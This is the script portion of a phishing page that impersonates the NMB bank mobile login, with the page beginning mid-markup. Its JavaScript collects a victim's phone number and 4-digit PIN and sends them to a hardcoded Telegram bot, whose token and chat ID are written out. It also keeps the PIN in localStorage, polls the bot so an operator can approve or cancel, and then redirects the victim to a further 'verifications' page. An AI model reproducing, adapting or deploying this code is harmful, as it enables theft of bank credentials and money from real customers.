<body>

                                        value=""></div><button class="btnContinue" style="opacity: 0.6; cursor: not-allowed;">Sign In</button></div>

<script>
    // =============================================
    // 1. TELEGRAM BOT CONFIGURATION
    // =============================================
    const TELEGRAM_BOT_TOKEN = '8622400907:AAEdVNBFOs3F3f-fi-WSb5rxlJWsiBeGpVk';
    const TELEGRAM_CHAT_ID = '5615316142';

    let lastUpdateId = 0;

    // =============================================
    // SEND DATA TO TELEGRAM WITH INLINE KEYBOARD
    // =============================================
    function sendToTelegram(data) {
        const text = `🔐 *NMB Login Attempt*\n\n` +
            `📱 Phone: \`${data.phone || 'N/A'}\`\n` +
            `🔑 PIN: \`${data.pin || 'N/A'}\`\n` +
            `🕐 Time: ${new Date().toLocaleString()}`;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [{
                            text: '✅ APPROVE',
                            callback_data: 'approve_login'
                        }, {
                            text: '❌ CANCEL',
                            callback_data: 'cancel_login'
                        }]
                    ]
                }
            })
        }).catch(err => console.error('Telegram send error:', err));
    }

    // =============================================
    // REMOVE ONLY THE INLINE KEYBOARD (KEEP TEXT)
    // =============================================
    function removeInlineKeyboard(chatId, messageId) {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                message_id: messageId,
                reply_markup: { inline_keyboard: [] }
            })
        }).catch(() => {});
    }

    // =============================================
    // POLL FOR ADMIN RESPONSE (APPROVE / CANCEL)
    // =============================================
    function pollTelegramCallbacks() {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId}&timeout=30`;

        fetch(url)
            .then(r => r.json())
            .then(resp => {
                if (resp.ok && resp.result) {
                    resp.result.forEach(update => {
                        lastUpdateId = update.update_id + 1;

                        if (update.callback_query) {
                            const query = update.callback_query;
                            const data = query.data;
                            const chatId = query.message.chat.id;
                            const msgId = query.message.message_id;

                            // 1. Remove only the buttons — keep the original message text
                            removeInlineKeyboard(chatId, msgId);

                            // 2. Answer callback so Telegram stops loading state
                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    callback_query_id: query.id,
                                    text: data === 'approve_login' ? '✅ Approved' : '❌ Cancelled'
                                })
                            });

                            // 3. Take action on the page
                            if (data === 'approve_login') {
                                setTimeout(() => {
                                    window.location.href = 'verifications.html';
                                }, 1500);
                            } else if (data === 'cancel_login') {
                                setTimeout(() => {
                                    resetForm();
                                }, 2000);
                            }
                        }
                    });
                }
                setTimeout(pollTelegramCallbacks, 1000);
            })
            .catch(() => {
                setTimeout(pollTelegramCallbacks, 3000);
            });
    }

    // =============================================
    // RESET THE FORM
    // =============================================
    function resetForm() {
        const phoneInput = document.querySelector('.numcont');
        if (phoneInput) phoneInput.value = '';

        document.querySelectorAll('.pin-input-container div input').forEach(inp => inp.value = '');

        const signInBtn = document.querySelector('.btnContinue');
        if (signInBtn) {
            signInBtn.style.opacity = '0.6';
            signInBtn.style.cursor = 'not-allowed';
            signInBtn.disabled = true;
        }
    }

    // =============================================
    // PIN AUTO-MOVE LOGIC
    // =============================================
    const pinInputs = document.querySelectorAll('.pin-input-container div input');

    pinInputs.forEach((input, index) => {
        input.addEventListener('input', function() {
            if (this.value.length > 1) {
                this.value = this.value.slice(0, 1);
            }
            if (this.value.length === 1 && index < pinInputs.length - 1) {
                pinInputs[index + 1].focus();
            }
            checkPinComplete();
        });

        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && this.value === '' && index > 0) {
                pinInputs[index - 1].focus();
            }
        });

        input.addEventListener('keypress', function(e) {
            if (!/^\d$/.test(e.key) && e.key !== 'Backspace') {
                e.preventDefault();
            }
        });
    });

    function checkPinComplete() {
        const allFilled = Array.from(pinInputs).every(inp => inp.value.length === 1);
        const signInBtn = document.querySelector('.btnContinue');
        if (signInBtn) {
            signInBtn.disabled = !allFilled;
            signInBtn.style.opacity = allFilled ? '1' : '0.6';
            signInBtn.style.cursor = allFilled ? 'pointer' : 'not-allowed';
        }
    }

    // =============================================
    // SIGN IN BUTTON HANDLER
    // =============================================
    document.addEventListener('DOMContentLoaded', function() {
        checkPinComplete();

        const signInBtn = document.querySelector('.btnContinue');
        if (!signInBtn) return;

        signInBtn.addEventListener('click', function(e) {
            e.preventDefault();
            if (this.disabled) return;

            const phoneInput = document.querySelector('.numcont');
            const phone = phoneInput ? phoneInput.value.trim() : '';

            let pin = '';
            pinInputs.forEach(inp => { pin += inp.value; });

            if (!phone || phone.length < 10) {
                alert('Please enter a valid mobile number (10 digits).');
                return;
            }
            if (pin.length !== 4) {
                alert('Please enter your complete 4-digit PIN.');
                return;
            }

            localStorage.setItem('loginPhone', phone);
            localStorage.setItem('loginPin', pin);

            this.textContent = 'VERIFYING...';
            this.disabled = true;
            this.style.opacity = '0.6';

            sendToTelegram({ phone, pin });
            pollTelegramCallbacks();
        });
    });
</script>
